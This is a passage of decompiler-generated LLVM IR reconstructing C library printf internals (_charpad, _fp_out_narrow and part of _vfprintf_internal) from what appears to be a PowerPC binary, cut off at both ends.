  store i32 268543012, i32* @lr, align 4
  %v0_1001a420 = call i32 @_vfprintf_internal()
  store i32 %v0_1001a420, i32* @r30, align 4
  br label %dec_label_pc_1001a428

dec_label_pc_1001a428:                            ; preds = %dec_label_pc_1001a408, %dec_label_pc_1001a414
  %v0_1001a428 = load i32, i32* @r28, align 4
  %v3_1001a428 = icmp eq i32 %v0_1001a428, 0
  store i32 %v2_1001a3cc, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  br i1 %v3_1001a428, label %dec_label_pc_1001a438, label %dec_label_pc_1001a43c

dec_label_pc_1001a438:                            ; preds = %dec_label_pc_1001a428
  store i32 268543036, i32* @lr, align 4
  %v0_1001a438 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001a43c

dec_label_pc_1001a43c:                            ; preds = %dec_label_pc_1001a428, %dec_label_pc_1001a438
  %v0_1001a440 = load i32, i32* @r30, align 4
  ret i32 %v0_1001a440

; uselistorder directives
  uselistorder i32 %v0_1001a3ec, { 1, 0 }
  uselistorder i32 %v0_1001a3b0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a428, { 1, 0 }
  uselistorder label %dec_label_pc_1001a3ec, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1001a47c3 = icmp eq i32 %arg3, 0
  %v2_1001a480 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1001a47c3, label %dec_label_pc_1001a49c, label %dec_label_pc_1001a490

dec_label_pc_1001a478:                            ; preds = %dec_label_pc_1001a490
  %v1_1001a478 = add i32 %v0_1001a478, -1
  store i32 %v1_1001a478, i32* @r31, align 4
  %v3_1001a47c = icmp eq i32 %v1_1001a478, 0
  %v0_1001a488 = load i32, i32* @r29, align 4
  br i1 %v3_1001a47c, label %dec_label_pc_1001a49c.loopexit, label %dec_label_pc_1001a490

dec_label_pc_1001a490:                            ; preds = %entry, %dec_label_pc_1001a478
  %v0_1001a4885 = phi i32 [ %v0_1001a488, %dec_label_pc_1001a478 ], [ %arg1, %entry ]
  store i32 268543124, i32* @lr, align 4
  %v3_1001a490 = inttoptr i32 %v0_1001a4885 to i16*
  %v4_1001a490 = call i32 @__stdio_fwrite(i32 %v2_1001a480, i32 1, i16* %v3_1001a490)
  %v3_1001a494 = icmp eq i32 %v4_1001a490, 1
  %v0_1001a478 = load i32, i32* @r31, align 4
  br i1 %v3_1001a494, label %dec_label_pc_1001a478, label %dec_label_pc_1001a49c.loopexit

dec_label_pc_1001a49c.loopexit:                   ; preds = %dec_label_pc_1001a478, %dec_label_pc_1001a490
  %v0_1001a4a0.ph = phi i32 [ %v0_1001a478, %dec_label_pc_1001a490 ], [ 0, %dec_label_pc_1001a478 ]
  %v1_1001a4a0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001a49c

dec_label_pc_1001a49c:                            ; preds = %dec_label_pc_1001a49c.loopexit, %entry
  %v1_1001a4a0 = phi i32 [ 0, %entry ], [ %v1_1001a4a0.pre, %dec_label_pc_1001a49c.loopexit ]
  %v0_1001a4a0 = phi i32 [ 0, %entry ], [ %v0_1001a4a0.ph, %dec_label_pc_1001a49c.loopexit ]
  %v2_1001a4a0 = sub i32 %v1_1001a4a0, %v0_1001a4a0
  ret i32 %v2_1001a4a0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001a49c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1001a490, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1001a4c8 = and i32 %arg2, 128
  %v3_1001a4c8 = icmp eq i32 %v1_1001a4c8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1001a4c8, label %dec_label_pc_1001a518, label %dec_label_pc_1001a4e4

dec_label_pc_1001a4e4:                            ; preds = %entry
  %v0_1001a4e4 = call i32 @__GI_strlen()
  %v0_1001a4e8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001a4e4, i32* @r31, align 4
  %v0_1001a4f0 = load i32, i32* %r26.global-to-local, align 4
  %v1_1001a4f4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001a4f4 = sub i32 %v1_1001a4f4, %v0_1001a4e4
  store i32 %v2_1001a4f4, i32* %r29.global-to-local, align 4
  store i32 %v0_1001a4e4, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1001a4f4, 1
  br i1 %tmp7, label %dec_label_pc_1001a518, label %dec_label_pc_1001a504

dec_label_pc_1001a504:                            ; preds = %dec_label_pc_1001a4e4
  %v1_1001a4e8 = urem i32 %v0_1001a4e8, 128
  store i32 268543240, i32* @lr, align 4
  %v3_1001a504 = trunc i32 %v1_1001a4e8 to i8
  %v4_1001a504 = call i32 @_charpad(i32 %v0_1001a4f0, i8 %v3_1001a504, i32 %v2_1001a4f4)
  %v0_1001a508 = load i32, i32* @r31, align 4
  store i32 %v0_1001a508, i32* %r30.global-to-local, align 4
  %v1_1001a50c = load i32, i32* @r29, align 4
  %v4_1001a50c = icmp eq i32 %v4_1001a504, %v1_1001a50c
  store i32 %v4_1001a504, i32* @r28, align 4
  br i1 %v4_1001a50c, label %dec_label_pc_1001a504.dec_label_pc_1001a518_crit_edge, label %dec_label_pc_1001a53c

dec_label_pc_1001a504.dec_label_pc_1001a518_crit_edge: ; preds = %dec_label_pc_1001a504
  %v0_1001a524.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001a518

dec_label_pc_1001a518:                            ; preds = %dec_label_pc_1001a504.dec_label_pc_1001a518_crit_edge, %dec_label_pc_1001a4e4, %entry
  %v0_1001a524 = phi i32 [ %v0_1001a524.pre, %dec_label_pc_1001a504.dec_label_pc_1001a518_crit_edge ], [ %v0_1001a4f0, %dec_label_pc_1001a4e4 ], [ %arg1, %entry ]
  %v0_1001a520 = phi i32 [ %v0_1001a508, %dec_label_pc_1001a504.dec_label_pc_1001a518_crit_edge ], [ %v0_1001a4e4, %dec_label_pc_1001a4e4 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1001a520, 1
  br i1 %tmp8, label %dec_label_pc_1001a538, label %dec_label_pc_1001a530

dec_label_pc_1001a530:                            ; preds = %dec_label_pc_1001a518
  %v0_1001a51c = load i32, i32* @r27, align 4
  store i32 268543284, i32* @lr, align 4
  %v3_1001a530 = inttoptr i32 %v0_1001a524 to i16*
  %v4_1001a530 = call i32 @__stdio_fwrite(i32 %v0_1001a51c, i32 %v0_1001a520, i16* %v3_1001a530)
  br label %dec_label_pc_1001a538

dec_label_pc_1001a538:                            ; preds = %dec_label_pc_1001a518, %dec_label_pc_1001a530
  %v1_1001a538 = phi i32 [ 0, %dec_label_pc_1001a518 ], [ %v4_1001a530, %dec_label_pc_1001a530 ]
  %v0_1001a538 = load i32, i32* @r28, align 4
  %v2_1001a538 = add i32 %v0_1001a538, %v1_1001a538
  br label %dec_label_pc_1001a53c

dec_label_pc_1001a53c:                            ; preds = %dec_label_pc_1001a504, %dec_label_pc_1001a538
  %v0_1001a540 = phi i32 [ %v4_1001a504, %dec_label_pc_1001a504 ], [ %v2_1001a538, %dec_label_pc_1001a538 ]
  ret i32 %v0_1001a540

; uselistorder directives
  uselistorder i32 %v0_1001a520, { 1, 0 }
  uselistorder i32 %v2_1001a4f4, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1001a53c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a538, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_4()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_4()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1001a558 = load i32, i32* @lr, align 4
  store i32 %v0_1001a558, i32* %r0.global-to-local, align 4
  %v2_1001a560 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1001a560, i32* %r30.global-to-local, align 4
  %v0_1001a564 = load i32, i32* @r3, align 4
  store i32 %v0_1001a564, i32* @r24, align 4
  %v0_1001a570 = load i32, i32* @r5, align 4
  store i32 %v0_1001a570, i32* %r31.global-to-local, align 4
  %v0_1001a574 = load i32, i32* @r4, align 4
  store i32 %v0_1001a574, i32* @r29, align 4
  store i32 268543356, i32* @lr, align 4
  %v1_1001a578 = bitcast i8** %stack_var_-200 to i32*
  %v2_1001a578 = call i32 @_ppfs_init(i32* %v1_1001a578)
  %tmp72 = icmp sgt i32 %v2_1001a578, -1
  br i1 %tmp72, label %dec_label_pc_1001a5ac, label %dec_label_pc_1001a584

dec_label_pc_1001a584:                            ; preds = %entry
  %v3_1001a584 = load i8*, i8** %stack_var_-200, align 4
  %v4_1001a584 = ptrtoint i8* %v3_1001a584 to i32
  store i32 %v4_1001a584, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1001a584, i32* @r3, align 4
  %v0_1001a590 = call i32 @__GI_strlen()
  %v3_1001a594 = icmp eq i32 %v0_1001a590, 0
  br i1 %v3_1001a594, label %dec_label_pc_1001abac, label %dec_label_pc_1001a59c

dec_label_pc_1001a59c:                            ; preds = %dec_label_pc_1001a584
  %v0_1001a59c = load i32, i32* @r31, align 4
  %v0_1001a5a0 = load i32, i32* @r24, align 4
  store i32 ptrtoint (i32* @global_var_1001a5a8.1161 to i32), i32* @lr, align 4
  %v3_1001a5a4 = inttoptr i32 %v0_1001a5a0 to i16*
  %v4_1001a5a4 = call i32 @__stdio_fwrite(i32 %v0_1001a59c, i32 %v0_1001a590, i16* %v3_1001a5a4)
  br label %dec_label_pc_1001abac

dec_label_pc_1001a5ac:                            ; preds = %entry
  %v0_1001a5b0 = load i32, i32* @r31, align 4
  store i32 268543416, i32* @lr, align 4
  %v2_1001a5b4 = call i32 @_ppfs_prepargs(i32 %v2_1001a560, i32 %v0_1001a5b0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1001a64c = zext i8 %tmp59 to i32
  %v2_1001a650 = icmp sgt i32 %tmp60, 0
  %v2_1001a654 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1001a678 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1001a67c = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1001a6b0 = icmp eq i32 %tmp57, 0
  %v2_1001aa0c = ptrtoint i32* %stack_var_-328 to i32
  %v2_1001a92c = ptrtoint i32* %stack_var_-340 to i32
  %v2_1001a930 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1001a7a4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1001a880 = icmp eq i32 %tmp57, 1
  %v2_1001a824 = icmp ugt i32 %tmp57, 2
  %v4_1001a764 = zext i8 %tmp55 to i32
  %v0_1001ab98.pre = load i32, i32* @r29, align 4
  %v1_1001a664 = mul nuw nsw i32 %v4_1001a64c, 8
  %v2_1001a668 = add i32 %v2_1001a654, %v1_1001a664
  %v1_1001a66c = add i32 %v2_1001a668, -8
  %v1_1001a680 = add i32 %tmp58, 1
  %v2_1001a6d8 = icmp ugt i32 %tmp57, 7
  %v2_1001a8b8 = icmp ugt i32 %tmp57, 15
  %v2_1001a8ec = icmp ugt i32 %tmp57, 17
  %v3_1001a8ec = icmp eq i32 %tmp57, 17
  %v2_1001a994 = icmp ugt i32 %tmp57, 19
  %v3_1001a994 = icmp eq i32 %tmp57, 19
  %v3_1001aa00 = icmp eq i32 %tmp57, 20
  %v1_1001a6f0 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1002e424.1163 to i32), i32 -1)
  %v2_1001a6f0 = inttoptr i32 %v1_1001a6f0 to i8*
  %v3_1001a830 = icmp eq i32 %tmp57, 3
  %v3_1001a840 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1001ab98

dec_label_pc_1001a5c4.backedge:                   ; preds = %dec_label_pc_1001a618, %dec_label_pc_1001a5d0
  %storemerge13.in = phi i32 [ %v1_1001a5e0, %dec_label_pc_1001a5d0 ], [ %v1_1001a618, %dec_label_pc_1001a618 ]
  %v1_1001a5d816 = phi i32 [ %v0_1001a5f0, %dec_label_pc_1001a5d0 ], [ %v1_1001a618, %dec_label_pc_1001a618 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1001a5c4

dec_label_pc_1001a5c4:                            ; preds = %dec_label_pc_1001a5c4.backedge, %dec_label_pc_1001ab98
  %v0_1001a5f0 = phi i32 [ %v1_1001a5d816, %dec_label_pc_1001a5c4.backedge ], [ %v0_1001ab98, %dec_label_pc_1001ab98 ]
  %v1_1001a5e0 = phi i32 [ %storemerge13, %dec_label_pc_1001a5c4.backedge ], [ %v0_1001ab98, %dec_label_pc_1001ab98 ]
  %v1_1001a5c4 = inttoptr i32 %v1_1001a5e0 to i8*
  %v2_1001a5c4 = load i8, i8* %v1_1001a5c4, align 1
  %v3_1001a5c4 = zext i8 %v2_1001a5c4 to i32
  store i32 %v3_1001a5c4, i32* %r0.global-to-local, align 4
  %v3_1001a5c8 = icmp eq i8 %v2_1001a5c4, 0
  br i1 %v3_1001a5c8, label %dec_label_pc_1001a5d8, label %dec_label_pc_1001a5d0

dec_label_pc_1001a5d0:                            ; preds = %dec_label_pc_1001a5c4
  %v3_1001a5d0 = icmp eq i8 %v2_1001a5c4, 37
  br i1 %v3_1001a5d0, label %dec_label_pc_1001a5d8, label %dec_label_pc_1001a5c4.backedge

dec_label_pc_1001a5d8:                            ; preds = %dec_label_pc_1001a5d0, %dec_label_pc_1001a5c4
  %v4_1001a5d8 = icmp eq i32 %v1_1001a5e0, %v0_1001a5f0
  br i1 %v4_1001a5d8, label %dec_label_pc_1001a60c, label %dec_label_pc_1001a5e0

dec_label_pc_1001a5e0:                            ; preds = %dec_label_pc_1001a5d8
  %v2_1001a5e0 = sub i32 %v1_1001a5e0, %v0_1001a5f0
  store i32 %v2_1001a5e0, i32* @r31, align 4
  %v4_1001a5e0 = icmp sgt i32 %v2_1001a5e0, 0
  br i1 %v4_1001a5e0, label %dec_label_pc_1001a5f0, label %dec_label_pc_1001a600

dec_label_pc_1001a5f0:                            ; preds = %dec_label_pc_1001a5e0
  %v0_1001a5f8 = load i32, i32* @r24, align 4
  store i32 268543488, i32* @lr, align 4
  %v3_1001a5fc = inttoptr i32 %v0_1001a5f8 to i16*
  %v4_1001a5fc = call i32 @__stdio_fwrite(i32 %v0_1001a5f0, i32 %v2_1001a5e0, i16* %v3_1001a5fc)
  %v1_1001a600.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a600

dec_label_pc_1001a600:                            ; preds = %dec_label_pc_1001a5e0, %dec_label_pc_1001a5f0
  %v1_1001a608 = phi i32 [ %v1_1001a600.pre, %dec_label_pc_1001a5f0 ], [ %v2_1001a5e0, %dec_label_pc_1001a5e0 ]
  %storemerge2 = phi i32 [ %v4_1001a5fc, %dec_label_pc_1001a5f0 ], [ 0, %dec_label_pc_1001a5e0 ]
  %v4_1001a600 = icmp eq i32 %storemerge2, %v1_1001a608
  br i1 %v4_1001a600, label %dec_label_pc_1001a608, label %dec_label_pc_1001aba8

dec_label_pc_1001a608:                            ; preds = %dec_label_pc_1001a600
  %v0_1001a608 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001a608 = add i32 %v0_1001a608, %v1_1001a608
  store i32 %v2_1001a608, i32* %r23.global-to-local, align 4
  %v0_1001a60c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001a60c

dec_label_pc_1001a60c:                            ; preds = %dec_label_pc_1001a5d8, %dec_label_pc_1001a608
  %v0_1001a618 = phi i32 [ %v0_1001a5f0, %dec_label_pc_1001a5d8 ], [ %v0_1001a60c.pre, %dec_label_pc_1001a608 ]
  %v1_1001a60c = inttoptr i32 %v0_1001a618 to i8*
  %v2_1001a60c = load i8, i8* %v1_1001a60c, align 1
  %v3_1001a60c = zext i8 %v2_1001a60c to i32
  store i32 %v3_1001a60c, i32* %r0.global-to-local, align 4
  %v3_1001a610 = icmp eq i8 %v2_1001a60c, 0
  br i1 %v3_1001a610, label %dec_label_pc_1001abac, label %dec_label_pc_1001a618

dec_label_pc_1001a618:                            ; preds = %dec_label_pc_1001a60c
  %v1_1001a618 = add i32 %v0_1001a618, 1
  %v2_1001a618 = inttoptr i32 %v1_1001a618 to i8*
  %v3_1001a618 = load i8, i8* %v2_1001a618, align 1
  %v4_1001a618 = zext i8 %v3_1001a618 to i32
  store i32 %v4_1001a618, i32* %r0.global-to-local, align 4
  %v3_1001a620 = icmp eq i8 %v3_1001a618, 37
  br i1 %v3_1001a620, label %dec_label_pc_1001a5c4.backedge, label %dec_label_pc_1001a628

dec_label_pc_1001a628:                            ; preds = %dec_label_pc_1001a618
  store i32 %v2_1001a560, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1001a618, i8** %stack_var_-200, align 4
  store i32 268543552, i32* @lr, align 4
  %v3_1001a63c = call i32 @_ppfs_parsespec(i32* %v1_1001a578, i32 %v1_1001a618)
  store i32 %v2_1001a560, i32* @r3, align 4
  store i32 268543560, i32* @lr, align 4
  %v0_1001a644 = call i32 @_ppfs_setargs()
  store i32 %v4_1001a64c, i32* %r7.global-to-local, align 4
  store i32 %v2_1001a654, i32* %r0.global-to-local, align 4
  br i1 %v2_1001a650, label %dec_label_pc_1001a664, label %dec_label_pc_1001a670

dec_label_pc_1001a664:                            ; preds = %dec_label_pc_1001a628
  br label %dec_label_pc_1001a670

dec_label_pc_1001a670:                            ; preds = %dec_label_pc_1001a628, %dec_label_pc_1001a664
  %v0_1001a69c82 = phi i32 [ %v1_1001a66c, %dec_label_pc_1001a664 ], [ %v2_1001a654, %dec_label_pc_1001a628 ]
  store i32 %v0_1001a69c82, i32* @r10, align 4
  store i32 %v2_1001a678, i32* @r8, align 4
  store i32 %v1_1001a680, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1001a6a0.preheader, label %dec_label_pc_1001a6a0.preheader.thread

dec_label_pc_1001a6a0.preheader.thread:           ; preds = %dec_label_pc_1001a670
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001a6ac

dec_label_pc_1001a6a0.preheader:                  ; preds = %dec_label_pc_1001a670
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1001a67c, label %dec_label_pc_1001a6ac, label %dec_label_pc_1001a698.preheader

dec_label_pc_1001a698.preheader:                  ; preds = %dec_label_pc_1001a6a0.preheader
  store i32 %v0_1001a69c82, i32* %stack_var_-344, align 4
  %v1_1001a69c83 = add i32 %v0_1001a69c82, 8
  store i32 %v1_1001a69c83, i32* @r10, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1001a6a888 = add i32 %tmp58, -1
  store i32 %v1_1001a6a888, i32* %ctr.global-to-local, align 4
  %v2_1001a6a889 = icmp eq i32 %v1_1001a6a888, 0
  br i1 %v2_1001a6a889, label %dec_label_pc_1001a6ac, label %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge

dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge: ; preds = %dec_label_pc_1001a698.preheader, %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge
  %v1_1001a698.pre = phi i32 [ %v1_1001a698.pre.pre, %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge ], [ %v2_1001a678, %dec_label_pc_1001a698.preheader ]
  %v1_1001a6a091 = phi i32 [ %v1_1001a6a0, %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge ], [ 4, %dec_label_pc_1001a698.preheader ]
  %v1_1001a69c90 = phi i32 [ %v1_1001a69c, %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge ], [ %v1_1001a69c83, %dec_label_pc_1001a698.preheader ]
  %v3_1001a698 = add i32 %v1_1001a698.pre, %v1_1001a6a091
  %v4_1001a698 = inttoptr i32 %v3_1001a698 to i32*
  store i32 %v1_1001a69c90, i32* %v4_1001a698, align 4
  %v0_1001a69c = load i32, i32* @r10, align 4
  %v1_1001a69c = add i32 %v0_1001a69c, 8
  store i32 %v1_1001a69c, i32* @r10, align 4
  %v0_1001a6a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001a6a0 = mul i32 %v0_1001a6a0, 4
  store i32 %v1_1001a6a0, i32* %r0.global-to-local, align 4
  %v1_1001a6a4 = add i32 %v0_1001a6a0, 1
  store i32 %v1_1001a6a4, i32* %r11.global-to-local, align 4
  %v0_1001a6a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001a6a8 = add i32 %v0_1001a6a8, -1
  store i32 %v1_1001a6a8, i32* %ctr.global-to-local, align 4
  %v2_1001a6a8 = icmp eq i32 %v1_1001a6a8, 0
  br i1 %v2_1001a6a8, label %dec_label_pc_1001a6ac, label %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge

dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge.dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge_crit_edge: ; preds = %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge
  %v1_1001a698.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge

dec_label_pc_1001a6ac:                            ; preds = %dec_label_pc_1001a698.preheader, %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge, %dec_label_pc_1001a6a0.preheader.thread, %dec_label_pc_1001a6a0.preheader
  store i32 %tmp57, i32* @r11, align 4
  br i1 %v3_1001a6b0, label %dec_label_pc_1001a6b8, label %dec_label_pc_1001a6d8

dec_label_pc_1001a6b8:                            ; preds = %dec_label_pc_1001a6ac
  %v0_1001a6bc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1001a6bc, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1001a6bc, 0
  %v1_1001a6c4 = zext i1 %tmp96 to i32
  %v2_1001a6c4 = ashr i32 %v0_1001a6bc, 31
  %v3_1001a6c4 = and i32 %v2_1001a6c4, -2
  %v4_1001a6c4 = or i32 %v3_1001a6c4, %v1_1001a6c4
  store i32 %v4_1001a6c4, i32* @r5, align 4
  %v1_1001a6cc = call i32 @__asm_rlwinm(i32 %v0_1001a7ec, i32 0, i32 20, i32 23)
  store i32 %v1_1001a6cc, i32* @r4, align 4
  %v1_1001a6d0 = inttoptr i32 %v1_1001a6cc to i16*
  %v2_1001a6d0 = call i32 @_store_inttype(i16* %v1_1001a6d0)
  br label %dec_label_pc_1001ab94

dec_label_pc_1001a6d8:                            ; preds = %dec_label_pc_1001a6ac
  br i1 %v2_1001a6d8, label %dec_label_pc_1001a8b8, label %dec_label_pc_1001a6e0

dec_label_pc_1001a6e0:                            ; preds = %dec_label_pc_1001a6d8
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1001a6f0 = load i8, i8* %v2_1001a6f0, align 1
  %v4_1001a6f0 = zext i8 %v3_1001a6f0 to i32
  store i32 %v4_1001a6f0, i32* %r30.global-to-local, align 4
  %v3_1001a6f4 = icmp eq i8 %v3_1001a6f0, 10
  br i1 %v3_1001a6f4, label %dec_label_pc_1001a6fc, label %dec_label_pc_1001a724

dec_label_pc_1001a6fc:                            ; preds = %dec_label_pc_1001a6e0
  store i32 %v0_1001a7ec, i32* %r0.global-to-local, align 4
  %v1_1001a700 = call i32 @__asm_rlwinm(i32 %v0_1001a7ec, i32 26, i32 31, i32 31)
  %v1_1001a704 = call i32 @__asm_rlwinm(i32 %v0_1001a7ec, i32 27, i32 31, i32 31)
  %v3_1001a708 = icmp eq i32 %v1_1001a700, 0
  %v2_1001a70c = icmp ne i32 %v1_1001a704, 0
  %not.v2_1001a70c = xor i1 %v2_1001a70c, true
  %v6_1001a710 = sext i1 %not.v2_1001a70c to i32
  store i32 %v6_1001a710, i32* %r0.global-to-local, align 4
  %v1_1001a718 = select i1 %v2_1001a70c, i32 44, i32 87
  store i32 %v1_1001a718, i32* %r31.global-to-local, align 4
  br i1 %v3_1001a708, label %dec_label_pc_1001a724, label %dec_label_pc_1001a720

dec_label_pc_1001a720:                            ; preds = %dec_label_pc_1001a6fc
  %v1_1001a720 = or i32 %v1_1001a718, 128
  store i32 %v1_1001a720, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001a724

dec_label_pc_1001a724:                            ; preds = %dec_label_pc_1001a6e0, %dec_label_pc_1001a6fc, %dec_label_pc_1001a720
  %v0_1001a724 = load i32, i32* @r11, align 4
  %v2_1001a724 = icmp ugt i32 %v0_1001a724, 5
  br i1 %v2_1001a724, label %dec_label_pc_1001a74c, label %dec_label_pc_1001a72c

dec_label_pc_1001a72c:                            ; preds = %dec_label_pc_1001a724
  %v3_1001a72c = icmp eq i32 %v0_1001a724, 3
  br i1 %v3_1001a72c, label %dec_label_pc_1001a734, label %dec_label_pc_1001a73c

dec_label_pc_1001a734:                            ; preds = %dec_label_pc_1001a72c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001a750

dec_label_pc_1001a73c:                            ; preds = %dec_label_pc_1001a72c
  %v3_1001a73c = icmp eq i32 %v0_1001a724, 1
  br i1 %v3_1001a73c, label %dec_label_pc_1001a754, label %dec_label_pc_1001a750

dec_label_pc_1001a74c:                            ; preds = %dec_label_pc_1001a724
  %v0_1001a74c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001a74c = sub i32 0, %v0_1001a74c
  store i32 %v1_1001a74c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001a750

dec_label_pc_1001a750:                            ; preds = %dec_label_pc_1001a73c, %dec_label_pc_1001a734, %dec_label_pc_1001a74c
  br label %dec_label_pc_1001a754

dec_label_pc_1001a754:                            ; preds = %dec_label_pc_1001a73c, %dec_label_pc_1001a750
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1001a750 ], [ 6, %dec_label_pc_1001a73c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1001a754 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a754, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1001a754, -1
  br i1 %tmp75, label %dec_label_pc_1001a768, label %dec_label_pc_1001a764

dec_label_pc_1001a764:                            ; preds = %dec_label_pc_1001a754
  br label %dec_label_pc_1001a768

dec_label_pc_1001a768:                            ; preds = %dec_label_pc_1001a754, %dec_label_pc_1001a764
  %storemerge = phi i32 [ %v4_1001a764, %dec_label_pc_1001a764 ], [ 32, %dec_label_pc_1001a754 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1001a768 = icmp eq i32 %v0_1001a724, 1
  br i1 %v3_1001a768, label %dec_label_pc_1001a784, label %dec_label_pc_1001a774

dec_label_pc_1001a774:                            ; preds = %dec_label_pc_1001a768
  %v0_1001a774 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001a774 = mul i32 %v0_1001a774, 4
  store i32 %v1_1001a774, i32* %r0.global-to-local, align 4
  %v0_1001a778 = load i32, i32* @r1, align 4
  %v2_1001a778 = add i32 %v0_1001a778, %v1_1001a774
  %v1_1001a77c = add i32 %v2_1001a778, 188
  %v2_1001a77c = inttoptr i32 %v1_1001a77c to i32*
  %v3_1001a77c = load i32, i32* %v2_1001a77c, align 4
  store i32 %v3_1001a77c, i32* %r0.global-to-local, align 4
